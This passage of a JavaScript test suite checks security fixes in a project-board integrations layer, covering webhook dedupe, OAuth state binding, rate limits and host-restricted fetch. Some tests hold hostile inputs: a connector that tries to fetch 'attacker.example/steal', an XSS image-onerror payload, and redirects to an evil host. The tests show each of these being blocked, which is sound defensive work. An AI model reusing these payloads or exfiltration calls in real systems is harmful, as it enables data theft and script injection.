// Integrations security review regressions (H1–H3, M1–M9, L1–L6): after-commit
// work of integration transactions, leased webhook dedupe, per-connection bus
// consumers, the act() scope, the integration actor, per-org connections,
// OAuth binding, webhook ingress limits, host-restricted fetch.

import { test } from 'node:test';
import assert from 'node:assert/strict';
import { request } from 'node:http';
import { randomBytes, randomUUID } from 'node:crypto';
import { Api } from '../api.js';
import { createBus, DEAD_AFTER } from '../bus.js';
import { openDb } from '../db.js';
import { createVault, loadKey } from '../vault.js';
import { feedEvent } from '../hub.js';
import { createIntegrations } from '../integrations/registry.js';
import { defineConnector } from '../integrations/connector.js';
import fake, { sign } from '../integrations/fake/index.js';
import { startHub } from './helpers.js';

async function setup() {
  const h = await startHub();
  h.hub.setVaultKey(randomBytes(32));
  return { h, reg: h.app.integrations, bus: h.app.bus };
}

async function connectFake(h, reg, { orgId = h.ids.org, memberId = h.ids.alice } = {}) {
  const v = await fake.connect.verifyToken({ token: 'fake_abcdef123456' });
  return reg.createConnection({ ...v, orgId, memberId, provider: 'fake' });
}

const post = (reg, conn, payload, { secret = 'whsec_abcdef123456', delivery = randomUUID() } = {}) => {
  const raw = Buffer.from(JSON.stringify(payload));
  return reg.webhook(conn.id, { headers: { 'x-fake-signature': sign(secret, raw), 'x-fake-delivery': delivery }, rawBody: raw });
};
const issue = (id, title = `Issue ${id}`) => ({ event: 'issue.opened', issue: { id, title } });

// A test connector: trusts `x-ok: 1` (no signature) and runs `hook` / `event`.
const probe = (id, { hook, event, consumes, ...over } = {}) => defineConnector({
  id, name: `Probe ${id}`, scopes: [], secrets: [], hosts: ['api.probe.example'],
  connect: { kind: 'token', verifyToken: async () => ({ external_id: 'w1' }) },
  verify: ({ headers }) => (headers['x-ok'] === '1' ? { ok: true, dedupe_key: headers['x-id'] } : { ok: false, reason: 'nope' }),
  handleWebhook: hook ?? (async () => {}),
  ...(event ? { consumes: consumes ?? ['card.transition'], onEvent: event } : {}),
  actions: { 'card.create': { default: 'auto' }, 'card.move': { default: 'auto' } },
  ...over,
});
const hookPost = (reg, conn, id, payload = {}) => reg.webhook(conn.id, { headers: { 'x-ok': '1', 'x-id': id }, rawBody: Buffer.from(JSON.stringify(payload)) });

function addOrg(h, name = 'Other') {
  const org = randomUUID();
  const board = randomUUID();
  const admin = randomUUID();
  const t = h.hub.iso();
  h.db.run('INSERT INTO orgs (id, name, created_at) VALUES (?, ?, ?)', org, name, t);
  h.db.run("INSERT INTO boards (id, org_id, name, key_prefix) VALUES (?, ?, ?, 'OTH')", board, org, name);
  h.db.run("INSERT INTO members (id, org_id, github_id, github_login, display_name, role, created_at) VALUES (?, ?, -99, 'carol', 'Carol', 'owner', ?)", admin, org, t);
  return { org, board, admin };
}

const manualTimers = () => {
  const q = [];
  return { setTimeout: (fn, ms) => { const t = { fn, ms }; q.push(t); return t; }, clearTimeout: (t) => { const i = q.indexOf(t); if (i >= 0) q.splice(i, 1); }, q };
};

// ── H1 ────────────────────────────────────────────────────────────────────

test('H1: a linked pr_merged moves an in_review card to done and flushes the after-commit work', async () => {
  const { h, reg } = await setup();
  try {
    const conn = await connectFake(h, reg);
    await post(reg, conn, issue('ISS-H1', 'Merge me'));
    const cardId = h.db.get("SELECT id FROM cards WHERE title = 'Merge me'").id;
    await reg.ctxFor(conn.id).act('card.create', {}, async (s) => s.link(cardId, 'pr', 'PR-77'));
    h.db.run("UPDATE cards SET repo_id = ?, run_state = 'in_review', column_name = 'in_review' WHERE id = ?", h.ids.repo, cardId);
    h.db.run("INSERT INTO evidence (id, card_id, kind, ref, verification, verified_at, created_at) VALUES (?, ?, 'pr', '#77', 'hub_verified', ?, ?)", randomUUID(), cardId, h.hub.iso(), h.hub.iso());
    let journalEvents = 0;
    h.hub.on('journal', () => { journalEvents += 1; });
    const r = await post(reg, conn, { event: 'pr.merged', pr: { id: 'PR-77', number: 77, merged_by: 'octo-cat', repo: 'acme/app' } });
    assert.equal(r.status, 200);
    const card = h.db.get('SELECT run_state, column_name FROM cards WHERE id = ?', cardId);
    assert.equal(card.column_name, 'done');
    assert.equal(h.hub.post.length, 0, 'no after-commit work stranded');
    assert.ok(journalEvents >= 1, "'journal' was emitted");
    const t = h.db.get("SELECT actor_kind, actor_id FROM journal WHERE card_id = ? AND kind = 'card.transition' ORDER BY seq DESC LIMIT 1", cardId);
    assert.deepEqual([t.actor_kind, t.actor_id], ['integration', conn.id]);
    const merged = h.db.get("SELECT payload FROM events WHERE card_id = ? AND kind = 'merged'", cardId);
    assert.deepEqual(JSON.parse(merged.payload), { pr: 77, by: 'octo-cat' });
  } finally { await h.close(); }
});

test('H1: connect and revoke flush too; ctx.system.event inside its own board queue is refused, not deadlocked', async () => {
  const { h, reg } = await setup();
  try {
    let journalEvents = 0;
    h.hub.on('journal', () => { journalEvents += 1; });
    const conn = await connectFake(h, reg);
    assert.equal(journalEvents, 1);
    assert.equal(h.hub.post.length, 0);
    await post(reg, conn, issue('ISS-DL', 'Deadlock'));
    const cardId = h.db.get("SELECT id FROM cards WHERE title = 'Deadlock'").id;
    const ctx = reg.ctxFor(conn.id);
    await ctx.act('card.create', {}, async (s) => s.link(cardId, 'pr', 'PR-DL'));
    await assert.rejects(h.hub.withBoard(h.ids.board, () => ctx.system.event('pr_merged', { kind: 'pr', external_id: 'PR-DL' })), /deadlock/);
    journalEvents = 0;
    reg.revokeConnection(conn.id, h.ids.alice);
    assert.equal(journalEvents, 1);
    assert.equal(h.hub.post.length, 0);
  } finally { await h.close(); }
});

// ── H2 ────────────────────────────────────────────────────────────────────

test('H2: two concurrent deliveries with one id run once (lease); an expired lease is taken over', async () => {
  const { h, reg } = await setup();
  try {
    const conn = await connectFake(h, reg);
    const delivery = randomUUID();
    const [a, b] = await Promise.all([post(reg, conn, issue('ISS-C1', 'Concurrent'), { delivery }), post(reg, conn, issue('ISS-C1', 'Concurrent'), { delivery })]);
    assert.equal(h.db.all("SELECT id FROM cards WHERE title = 'Concurrent'").length, 1);
    // The retry of a delivery still running is 503 + Retry-After (hardening M-2), never 200.
    assert.deepEqual([a.status, b.status].sort(), [200, 503]);
    const busy = a.status === 503 ? a : b;
    assert.equal(busy.body.in_progress, true);
    assert.equal(busy.headers['retry-after'], String(busy.body.retry_after_s));
    assert.equal(h.db.get('SELECT state FROM inbound_dedupe WHERE dedupe_key = ?', `${conn.id}:${delivery}`).state, 'done');
    assert.deepEqual((await post(reg, conn, issue('ISS-C1'), { delivery })).body, { ok: true, duplicate: true });
    // A crashed handler's lease (in the past) doesn't block the retry forever.
    const stale = randomUUID();
    const past = new Date(h.hub.wallMs() - 1000).toISOString();
    h.db.run("INSERT INTO inbound_dedupe (provider, dedupe_key, received_at, state, lease_until) VALUES ('fake', ?, ?, 'processing', ?)", `${conn.id}:${stale}`, past, past);
    assert.deepEqual((await post(reg, conn, issue('ISS-C2', 'Taken over'), { delivery: stale })).body, { ok: true });
    assert.equal(h.db.all("SELECT id FROM cards WHERE title = 'Taken over'").length, 1);
    // A live lease answers in_progress without running.
    const live = randomUUID();
    const future = new Date(h.hub.wallMs() + 60_000).toISOString();
    h.db.run("INSERT INTO inbound_dedupe (provider, dedupe_key, received_at, state, lease_until) VALUES ('fake', ?, ?, 'processing', ?)", `${conn.id}:${live}`, past, future);
    const leased = await post(reg, conn, issue('ISS-C3', 'Leased'), { delivery: live });
    assert.equal(leased.status, 503);
    assert.deepEqual(leased.body, { ok: false, in_progress: true, retry_after_s: 60 });
    assert.deepEqual(leased.headers, { 'retry-after': '60' });
    assert.equal(h.db.all("SELECT id FROM cards WHERE title = 'Leased'").length, 0);
  } finally { await h.close(); }
});

test('H2: a failed handler releases the delivery so the provider retry runs; old rows are swept', async () => {
  const { h, reg } = await setup();
  try {
    let calls = 0;
    reg.register(probe('flaky', {
      hook: async ({ ctx }) => {
        calls += 1;
        if (calls === 1) throw new Error('upstream 500 token=xoxb-123456789012345678901234');
        await ctx.act('card.create', { external_ref: 'X1' }, async (s) => s.actAs(ctx.connection.created_by).createCard(ctx.boardIds()[0], { request_id: 'x1', title: 'Retried' }));
      },
    }));
    const conn = reg.createConnection({ orgId: h.ids.org, memberId: h.ids.alice, provider: 'flaky', external_id: 'w1' });
    assert.equal((await hookPost(reg, conn, 'd-1')).status, 500);
    assert.equal(h.db.get('SELECT COUNT(*) AS n FROM inbound_dedupe WHERE provider = ?', 'flaky').n, 0);
    assert.equal(reg.get(conn.id).health.last_error, 'handler_failed', 'a short code, never provider text');
    assert.equal((await hookPost(reg, conn, 'd-1')).status, 200);
    assert.equal(h.db.all("SELECT id FROM cards WHERE title = 'Retried'").length, 1);
    const old = new Date(h.hub.wallMs() - 31 * 24 * 3600_000).toISOString();
    h.db.run("INSERT INTO inbound_dedupe (provider, dedupe_key, received_at, state) VALUES ('flaky', 'ancient', ?, 'done')", old);
    reg.sweepDedupe();
    assert.equal(h.db.get("SELECT COUNT(*) AS n FROM inbound_dedupe WHERE dedupe_key = 'ancient'").n, 0);
    assert.equal(h.db.get('SELECT COUNT(*) AS n FROM inbound_dedupe WHERE provider = ?', 'flaky').n, 2, 'the delivery key and the body hash');
  } finally { await h.close(); }
});

// ── H3 / M1 ───────────────────────────────────────────────────────────────

test('H3: one consumer per connection: org A’s always-failing connection neither delays nor dead-letters org B’s', async () => {
  const h = await startHub();
  try {
    h.hub.setVaultKey(randomBytes(32));
    const timers = manualTimers();
    const bus = createBus({ db: h.db, timers });
    h.hub.on('journal', () => bus.poke());
    const reg = createIntegrations({ hub: h.hub, api: new Api(h.hub), bus, log: null });
    const B = addOrg(h);
    const seen = [];
    reg.register(probe('per-org', {
      event: async (row, ctx) => {
        if (ctx.connection.org_id === h.ids.org) throw new Error('always broken');
        seen.push(row.payload.n);
      },
    }));
    const a = reg.createConnection({ orgId: h.ids.org, memberId: h.ids.alice, provider: 'per-org', external_id: 'w1' });
    const b = reg.createConnection({ orgId: B.org, memberId: B.admin, provider: 'per-org', external_id: 'w1' });
    await bus.settle();
    h.hub.journal({ board_id: h.ids.board, kind: 'card.transition', payload: { n: 'a1' } });
    h.hub.journal({ board_id: B.board, kind: 'card.transition', payload: { n: 'b1' } });
    // M1: hub-wide rows (no board) or an unknown board reach no connection.
    h.hub.journal({ board_id: null, kind: 'card.transition', payload: { n: 'null' } });
    h.hub.journal({ board_id: 'no-such-board', kind: 'card.transition', payload: { n: 'ghost' } });
    await bus.settle();
    assert.deepEqual(seen, ['b1'], 'B served at once while A is failing');
    for (let i = 1; i < DEAD_AFTER; i += 1) { timers.q.shift().fn(); await bus.settle(); }
    h.hub.journal({ board_id: B.board, kind: 'card.transition', payload: { n: 'b2' } });
    await bus.settle();
    assert.deepEqual(seen, ['b1', 'b2']);
    const health = Object.fromEntries(bus.health().map((x) => [x.consumer, x]));
    assert.equal(health[`integration:per-org:${a.id}`].dead_letters, 1);
    assert.equal(health[`integration:per-org:${b.id}`].dead_letters, 0);
    assert.equal(health[`integration:per-org:${b.id}`].backlog, 0);
    assert.match(h.db.get('SELECT error FROM bus_dead_letters').error, /^handler_failed/);
    // Revoke unsubscribes; a new registry on boot subscribes the active ones.
    reg.revokeConnection(a.id, h.ids.alice);
    assert.equal(bus.has(`integration:per-org:${a.id}`), false);
    const bus2 = createBus({ db: h.db, timers: manualTimers() });
    const reg2 = createIntegrations({ hub: h.hub, api: new Api(h.hub), bus: bus2, log: null });
    reg2.register(probe('per-org', { event: async () => {} }));
    assert.equal(bus2.has(`integration:per-org:${b.id}`), true);
    assert.equal(bus2.has(`integration:per-org:${a.id}`), false);
  } finally { await h.close(); }
});

test('H3: a hung onEvent or handleWebhook times out instead of blocking for ever', async () => {
  const h = await startHub();
  try {
    h.hub.setVaultKey(randomBytes(32));
    const timers = manualTimers();
    const bus = createBus({ db: h.db, timers });
    h.hub.on('journal', () => bus.poke());
    const reg = createIntegrations({ hub: h.hub, api: new Api(h.hub), bus, log: null, handlerTimeoutMs: 30 });
    reg.register(probe('hangs', { event: () => new Promise(() => {}), hook: () => new Promise(() => {}) }));
    const conn = reg.createConnection({ orgId: h.ids.org, memberId: h.ids.alice, provider: 'hangs', external_id: 'w1' });
    const r = await hookPost(reg, conn, 'slow-1');
    assert.equal(r.status, 500);
    assert.equal(reg.get(conn.id).health.last_error, 'handler_timeout');
    assert.equal(h.db.get("SELECT state FROM inbound_dedupe WHERE provider = 'hangs'").state, 'processing', 'leased until lease_until (L-a)');
    await bus.settle();
    h.hub.journal({ board_id: h.ids.board, kind: 'card.transition', payload: {} });
    await new Promise((res) => setTimeout(res, 80));
    await bus.settle();
    const hh = bus.health().find((x) => x.consumer === `integration:hangs:${conn.id}`);
    assert.equal(hh.failures, 1);
    assert.match(hh.last_error.message, /handler_timeout/);
  } finally { await h.close(); }
});

// ── M2 ────────────────────────────────────────────────────────────────────

test('M2: through actAs an integration never dispatches or answers permissions; replays {status, body}; ids are per connection', async () => {
  const { h, reg } = await setup();
  try {
    const conn = await connectFake(h, reg);
    const ctx = reg.ctxFor(conn.id);
    const card = (await ctx.act('card.create', {}, (s) => s.actAs(h.ids.alice).createCard(h.ids.board, { request_id: 'r1', title: 'Once' }))).result.card;
    for (const action of ['dispatch', 'retry', 'take_over_with_claude']) {
      await assert.rejects(ctx.act('card.create', { card_id: card.id }, (s) => s.actAs(h.ids.alice).action(card.id, action, { request_id: randomUUID() })), (e) => e.code === 'POLICY_DENIED');
    }
    await assert.rejects(ctx.act('card.create', {}, (s) => s.actAs(h.ids.alice).answerPermission('x', { decision: 'allow' })), (e) => e.code === 'POLICY_DENIED');
    assert.equal(h.db.get('SELECT COUNT(*) AS n FROM dispatches WHERE card_id = ?', card.id).n, 0);
    const failed = reg.audit(conn.id).filter((a) => a.decision === 'failed');
    assert.equal(failed.length, 4);
    assert.ok(failed.every((a) => a.error === 'policy_denied'));
    // (b) replay: same request id → same body, no second card; a cached error is thrown again.
    const again = (await ctx.act('card.create', {}, (s) => s.actAs(h.ids.alice).createCard(h.ids.board, { request_id: 'r1', title: 'Once' }))).result.card;
    assert.equal(again.id, card.id);
    assert.equal(h.db.all("SELECT id FROM cards WHERE title = 'Once'").length, 1);
    const bad = () => ctx.act('card.create', {}, (s) => s.actAs(h.ids.alice).createCard('no-such-board', { request_id: 'r2', title: 'Nope' }));
    await assert.rejects(bad(), (e) => e.code === 'NOT_FOUND');
    const hit = h.hub.cachedResponse(h.ids.alice, `int:${conn.id}:r2`);
    assert.equal(hit.status, 404);
    await assert.rejects(bad(), (e) => e.code === 'NOT_FOUND' && e.message === hit.body.error.message);
    // (c) namespaced: the member's own browser request id r1 is untouched.
    assert.equal(h.hub.cachedResponse(h.ids.alice, 'r1'), null);
    assert.ok(h.hub.cachedResponse(h.ids.alice, `int:${conn.id}:r1`));
  } finally { await h.close(); }
});

// ── M3 ────────────────────────────────────────────────────────────────────

test('M3: act() audits attempted → auto | failed(code); the journal and feed show the integration, not the member', async () => {
  const { h, reg } = await setup();
  try {
    const conn = await connectFake(h, reg);
    const ctx = reg.ctxFor(conn.id);
    await ctx.act('card.create', { external_ref: 'E1' }, async () => {
      assert.equal(reg.audit(conn.id)[0].decision, 'attempted');
    });
    assert.equal(reg.audit(conn.id)[0].decision, 'auto');
    await assert.rejects(ctx.act('card.create', { external_ref: 'E2' }, async () => { throw new Error('provider said: secret-ish text'); }), /secret-ish/);
    const f = reg.audit(conn.id)[0];
    assert.deepEqual([f.decision, f.error], ['failed', 'handler_failed']);
    await post(reg, conn, issue('ISS-ACT', 'By the integration'));
    const card = h.db.get("SELECT id, created_by FROM cards WHERE title = 'By the integration'");
    assert.equal(card.created_by, h.ids.alice, 'permissions are still the member’s');
    const j = h.db.get("SELECT actor_kind, actor_id, payload FROM journal WHERE card_id = ? AND kind = 'card.create'", card.id);
    assert.deepEqual([j.actor_kind, j.actor_id, JSON.parse(j.payload).on_behalf_of], ['integration', conn.id, h.ids.alice]);
    const ev = h.db.get("SELECT * FROM events WHERE card_id = ? AND kind = 'created'", card.id);
    assert.equal(feedEvent(h.hub, ev).actor_name, 'Fake tracker');
    // The member's own actions stay theirs.
    const alice = await h.login('alice');
    const mine = await h.createCard(alice, { title: 'Mine' });
    assert.equal(h.db.get("SELECT actor_kind FROM journal WHERE card_id = ? AND kind = 'card.create'", mine.id).actor_kind, 'member');
  } finally { await h.close(); }
});

test('M3: when the member it acts as is removed or made a viewer, the provider gets 200 and health says why', async () => {
  const { h, reg } = await setup();
  try {
    const conn = await connectFake(h, reg);
    // A second owner, so alice may be demoted or removed (members_keep_an_owner, D59).
    h.db.run("UPDATE members SET role = 'owner' WHERE id = ?", h.ids.bob);
    h.db.run("UPDATE members SET role = 'viewer' WHERE id = ?", h.ids.alice);
    const delivery = randomUUID();
    const r = await post(reg, conn, issue('ISS-GONE', 'Nobody to act as'), { delivery });
    assert.deepEqual([r.status, r.body], [200, { ok: true, skipped: true }]);
    assert.equal(reg.get(conn.id).health.last_error, 'actor_unavailable');
    assert.equal(h.db.all("SELECT id FROM cards WHERE title = 'Nobody to act as'").length, 0);
    assert.deepEqual((await post(reg, conn, issue('ISS-GONE'), { delivery })).body, { ok: true, duplicate: true }, 'not retried for ever');
    h.db.run("UPDATE members SET role = 'owner', removed_at = ? WHERE id = ?", h.hub.iso(), h.ids.alice);
    assert.equal((await post(reg, conn, issue('ISS-GONE2'))).status, 200);
    assert.equal(reg.audit(conn.id)[0].error, 'actor_unavailable');
  } finally { await h.close(); }
});

// ── M4 ────────────────────────────────────────────────────────────────────

test('M4: link only to this org’s cards; pr and by are validated before they reach the state machine', async () => {
  const { h, reg } = await setup();
  try {
    const B = addOrg(h);
    const conn = await connectFake(h, reg);
    const ctx = reg.ctxFor(conn.id);
    const foreign = randomUUID();
    const t = h.hub.iso();
    h.db.run("INSERT INTO cards (id, board_id, key, title, created_by, created_at, updated_at, state_since) VALUES (?, ?, 'OTH-1', 'Theirs', ?, ?, ?, ?)", foreign, B.board, B.admin, t, t, t);
    await assert.rejects(ctx.act('card.create', {}, async (s) => s.link(foreign, 'pr', 'PR-X')), (e) => e.code === 'NOT_FOUND');
    assert.equal(ctx.linked('pr', 'PR-X'), null);
    await post(reg, conn, issue('ISS-M4', 'Validated'));
    const cardId = h.db.get("SELECT id FROM cards WHERE title = 'Validated'").id;
    await ctx.act('card.create', {}, async (s) => s.link(cardId, 'pr', 'PR-M4'));
    h.db.run("UPDATE cards SET repo_id = ?, run_state = 'in_review', column_name = 'in_review' WHERE id = ?", h.ids.repo, cardId);
    h.db.run("INSERT INTO evidence (id, card_id, kind, ref, verification, verified_at, created_at) VALUES (?, ?, 'pr', '#5', 'hub_verified', ?, ?)", randomUUID(), cardId, h.hub.iso(), h.hub.iso());
    // A pr that is not an integer is dropped, so it is never the verified PR.
    assert.equal((await ctx.system.event('pr_merged', { kind: 'pr', external_id: 'PR-M4', pr: 5.5, repo: 'acme/app' })).reason, 'not_the_verified_pr');
    assert.deepEqual(reg.audit(conn.id).find((a) => a.action === 'system.pr_merged').detail, { pr: null });
    const r = await ctx.system.event('pr_merged', { kind: 'pr', external_id: 'PR-M4', pr: 5, repo: 'acme/app', by: '<img src=x onerror=alert(1)>' });
    assert.equal(r.done, true);
    assert.deepEqual(JSON.parse(h.db.get("SELECT payload FROM events WHERE card_id = ? AND kind = 'merged'", cardId).payload), { pr: 5, by: null });
  } finally { await h.close(); }
});

// ── M5 / M6 ───────────────────────────────────────────────────────────────

test('M5/M6: reconnect after revoke keeps the old row and its audit; unique per org, so two teams can connect one workspace', async () => {
  const { h, reg } = await setup();
  try {
    const first = await connectFake(h, reg);
    await post(reg, first, issue('ISS-R1'));
    reg.revokeConnection(first.id, h.ids.alice);
    const second = await connectFake(h, reg);
    assert.notEqual(second.id, first.id);
    assert.equal(h.db.get('SELECT status FROM connections WHERE id = ?', first.id).status, 'revoked');
    assert.equal(reg.audit(first.id).length, 1, 'audit history survives');
    reg.revokeConnection(second.id, h.ids.alice);
    await connectFake(h, reg);
    await assert.rejects(connectFake(h, reg), (e) => e.code === 'CONFLICT');
    const B = addOrg(h);
    const theirs = await connectFake(h, reg, { orgId: B.org, memberId: B.admin });
    assert.equal(theirs.external_id, 'fake-workspace-1');
    assert.equal(reg.list(B.org).length, 1);
    assert.equal(reg.list(h.ids.org).length, 1);
  } finally { await h.close(); }
});

const fakeOauth = defineConnector({
  id: 'fake-oauth', name: 'Fake OAuth', scopes: ['read'], secrets: ['access_token'], hosts: ['fake-oauth.example'],
  connect: {
    kind: 'oauth',
    authorizeUrl: ({ state }) => `https://fake-oauth.example/authorize?state=${encodeURIComponent(state)}`,
    async exchange({ query }) {
      if (query.get('code') !== 'good-code') throw new Error('bad code');
      return { external_id: 'ws-oauth-1', display_name: 'OAuth workspace', scopes: ['read'], secrets: { access_token: 'tok_oauth_secret' }, orgId: 'evil-org', memberId: 'evil' };
    },
  },
});

test('M6: OAuth state is bound to the browser that started it: another browser’s cookie or none is refused', async () => {
  const { h, reg } = await setup();
  try {
    reg.register(fakeOauth);
    const alice = await h.login('alice');
    const start = async () => {
      const r = await h.api(alice, 'POST', '/api/integrations/fake-oauth/start', { request_id: randomUUID() });
      assert.equal(r.status, 200, r.text);
      return { state: new URL(r.body.url).searchParams.get('state'), cookie: r.headers.get('set-cookie').split(';')[0] };
    };
    const cb = (state, cookie) => fetch(`${h.base}/integrations/fake-oauth/callback?${new URLSearchParams({ state, code: 'good-code' })}`, { headers: cookie ? { cookie } : {} });
    const s1 = await start();
    const other = await start();
    for (const cookie of [other.cookie, null]) {
      const r = await cb(s1.state, cookie);
      assert.equal(r.status, 400);
      assert.match(await r.text(), /Open this link in the window Plexiform opened/);
    }
    assert.equal(reg.list(h.ids.org).filter((c) => c.provider === 'fake-oauth').length, 0);
    // Refused before the single-use nonce is spent: the right browser still connects, once.
    const r1 = await cb(s1.state, s1.cookie);
    assert.equal(r1.status, 200);
    assert.match(await r1.text(), /data-connect="ok"/);
    assert.match(r1.headers.get('set-cookie'), /Max-Age=0/);
    const created = reg.list(h.ids.org).find((c) => c.provider === 'fake-oauth');
    assert.equal(h.db.get('SELECT org_id FROM connections WHERE id = ?', created.id).org_id, h.ids.org, 'exchange output cannot pick the org');
    assert.match(await (await cb(s1.state, s1.cookie)).text(), /already used/);
  } finally { await h.close(); }
});

// ── M7 ────────────────────────────────────────────────────────────────────

test('M7: callback and webhook failures are a generic 500; a multi-byte state signature is just invalid', async () => {
  const { h, reg } = await setup();
  try {
    reg.register(fakeOauth);
    const alice = await h.login('alice');
    const st = new URL((await h.api(alice, 'POST', '/api/integrations/fake-oauth/start', { request_id: randomUUID() })).body.url).searchParams.get('state');
    const weird = await fetch(`${h.base}/integrations/fake-oauth/callback?${new URLSearchParams({ state: `${st.split('.')[0]}.${'é'.repeat(43)}` })}`);
    assert.equal(weird.status, 400);
    assert.match(await weird.text(), /not valid/);
    const conn = await connectFake(h, reg);
    const real = { cb: reg.oauthCallback, hook: reg.webhook };
    reg.oauthCallback = async () => { throw new Error('boom secret'); };
    reg.webhook = async () => { throw new Error('boom secret'); };
    const c = await fetch(`${h.base}/integrations/fake-oauth/callback?state=x`);
    assert.equal(c.status, 500);
    assert.ok(!(await c.text()).includes('boom'));
    const w = await fetch(`${h.base}/integrations/${conn.id}/webhook`, { method: 'POST', body: '{}' });
    assert.equal(w.status, 500);
    assert.deepEqual(await w.json(), { error: { code: 'INTERNAL', message: 'internal error' } });
    Object.assign(reg, { oauthCallback: real.cb, webhook: real.hook });
    assert.equal((await fetch(`${h.base}/api/health`)).status, 200, 'the hub is still up');
  } finally { await h.close(); }
});

// ── M8 ────────────────────────────────────────────────────────────────────

// D97 slice B3 (amendment 4): an unknown id's body is read like any other
// (so it can't be told from a pending id), under the same deadline.
test('M8: an unknown webhook target never holds the hub past the read deadline', async () => {
  const h = await startHub({ config: { webhookReads: { deadlineMs: 300 } } });
  try {
    const u = new URL(`${h.base}/integrations/${randomUUID()}/webhook`);
    const status = await new Promise((resolve, reject) => {
      const req = request({ host: u.hostname, port: u.port, path: u.pathname, method: 'POST', headers: { 'content-length': String(500_000) } }, (res) => { res.resume(); resolve(res.statusCode); });
      req.on('error', reject);
      req.write('{"partial":');
      setTimeout(() => reject(new Error('the hub waited past its deadline')), 2000).unref();
    });
    assert.equal(status, 408);
  } finally { await h.close(); }
});

test('M8: per-connection webhook bucket; failed signatures spend a per-(connection, IP) bucket that then refuses failures, never a verified delivery; mutate_ip is not used', async () => {
  const { h, reg } = await setup();
  try {
    const conn = await connectFake(h, reg);
    const lim = h.hub.limiter.limits;
    lim.mutate_ip = { capacity: 1, per_ms: 60_000 };
    lim.webhook_fail_ip = { capacity: 2, per_ms: 60_000 };
    lim.webhook_conn = { capacity: 5, per_ms: 60_000 };
    const hook = (raw, sig) => fetch(`${h.base}/integrations/${conn.id}/webhook`, { method: 'POST', headers: { 'content-type': 'application/json', 'x-fake-signature': sig, 'x-fake-delivery': randomUUID() }, body: raw });
    const raw = JSON.stringify({ event: 'noop' });
    const good = sign('whsec_abcdef123456', Buffer.from(raw));
    assert.equal((await hook(raw, good)).status, 200);
    assert.equal((await hook(raw, good)).status, 200, 'mutate_ip (capacity 1) is not in this path');
    assert.equal((await hook(raw, 'sha256=00')).status, 401);
    assert.equal((await hook(raw, 'sha256=00')).status, 401);
    assert.equal((await hook(raw, 'sha256=00')).status, 429);
    assert.equal((await hook(JSON.stringify({ event: 'noop', n: 2 }), sign('whsec_abcdef123456', Buffer.from(JSON.stringify({ event: 'noop', n: 2 }))))).status, 200, 'a verified delivery is never refused by the failure bucket (M-1, round 4)');
  } finally { await h.close(); }
});

// ── M9 / L1 ───────────────────────────────────────────────────────────────

test('M9: ctx.fetch reaches only declared https hosts and follows one same-host redirect', async () => {
  const h = await startHub();
  try {
    h.hub.setVaultKey(randomBytes(32));
    const calls = [];
    const routes = {
      'https://api.fake.example/hop': { status: 302, location: '/end' },
      'https://api.fake.example/end': { status: 200 },
      'https://api.fake.example/off': { status: 302, location: 'https://evil.example/x' },
      'https://api.fake.example/loop': { status: 302, location: '/loop2' },
      'https://api.fake.example/loop2': { status: 302, location: '/end' },
    };
    const reg = createIntegrations({
      hub: h.hub, api: new Api(h.hub), log: null, sleep: async () => {},
      fetchImpl: async (url, init) => {
        calls.push([url, init.redirect]);
        const r = routes[url] ?? { status: 200 };
        return { status: r.status, headers: new Map(r.location ? [['location', r.location]] : []) };
      },
    });
    reg.register(fake);
    const conn = await connectFake(h, reg);
    const ctx = reg.ctxFor(conn.id);
    for (const bad of ['https://evil.example/x', 'http://api.fake.example/x', 'https://api.fake.example:444/x', 'https://u:p@api.fake.example/x']) {
      await assert.rejects(ctx.fetch(bad), (e) => e.healthCode === 'host_refused', bad);
    }
    assert.equal(calls.length, 0);
    assert.equal(reg.get(conn.id).health.last_error, 'host_refused');
    assert.equal((await ctx.fetch('https://api.fake.example/hop')).status, 200);
    assert.deepEqual(calls.map((c) => c[0]), ['https://api.fake.example/hop', 'https://api.fake.example/end']);
    assert.ok(calls.every((c) => c[1] === 'manual'));
    await assert.rejects(ctx.fetch('https://api.fake.example/off'), (e) => e.healthCode === 'host_refused');
    await assert.rejects(ctx.fetch('https://api.fake.example/loop'), /too many redirects/);
  } finally { await h.close(); }
});

test('M9/L1: verifyToken gets the restricted fetch; its error text never reaches the user', async () => {
  const { h, reg } = await setup();
  try {
    reg.register(defineConnector({
      id: 'leaky', name: 'Leaky', scopes: [], secrets: [], hosts: ['api.leaky.example'],
      connect: { kind: 'token', async verifyToken({ fetch: f }) { await f('https://attacker.example/steal'); return { external_id: 'x' }; } },
    }));
    await assert.rejects(reg.verifyToken('leaky', 't'), (e) => e.healthCode === 'host_refused');
    const alice = await h.login('alice');
    const r = await h.api(alice, 'POST', '/api/integrations/leaky/token', { request_id: randomUUID(), token: 'tok' });
    assert.equal(r.status, 400);
    assert.equal(r.body.error.message, 'That token was not accepted. Check it and try again.');
    assert.ok(!r.text.includes('attacker'));
  } finally { await h.close(); }
});

// ── L2–L6 ─────────────────────────────────────────────────────────────────

test('L3/L4: settings are own actions only, config ≤ 8 KB, revoked is gone; audit keeps scalars ≤ 2 KB', async () => {
  const { h, reg } = await setup();
  try {
    const conn = await connectFake(h, reg);
    assert.throws(() => reg.setSettings(conn.id, { autonomy: { toString: 'auto' } }), /no action/);
    assert.throws(() => reg.setSettings(conn.id, { config: { blob: 'x'.repeat(9000) } }), /8 KB/);
    assert.throws(() => reg.setSettings(conn.id, { autonomy: ['auto'] }), /object/);
    await reg.ctxFor(conn.id).act('card.create', {
      detail: { pr: 12, ok: true, id: 'ISS-1', text: 'y'.repeat(500), nested: { a: 1 } },
      undo: { card_id: 'c1', body: 'z'.repeat(300) },
    }, async () => {});
    const a = reg.audit(conn.id)[0];
    assert.deepEqual(a.detail, { pr: 12, ok: true, id: 'ISS-1' });
    assert.deepEqual(a.undo, { card_id: 'c1' });
    const alice = await h.login('alice');
    reg.revokeConnection(conn.id, h.ids.alice);
    assert.throws(() => reg.setSettings(conn.id, { autonomy: {} }), (e) => e.code === 'NOT_FOUND');
    assert.equal((await h.api(alice, 'PATCH', `/api/integrations/${conn.id}`, { request_id: randomUUID(), autonomy: {} })).status, 404);
    assert.equal((await h.api(alice, 'DELETE', `/api/integrations/${conn.id}`, { request_id: randomUUID() })).status, 404);
  } finally { await h.close(); }
});

test('L5: vault refuses short ciphertexts and non-canonical base64 keys', () => {
  const v = createVault(randomBytes(32));
  const sealed = v.seal('c', 'k', 'x');
  assert.throws(() => v.open('c', 'k', { ...sealed, ciphertext: Buffer.alloc(8) }), /truncated/);
  const b64 = randomBytes(32).toString('base64');
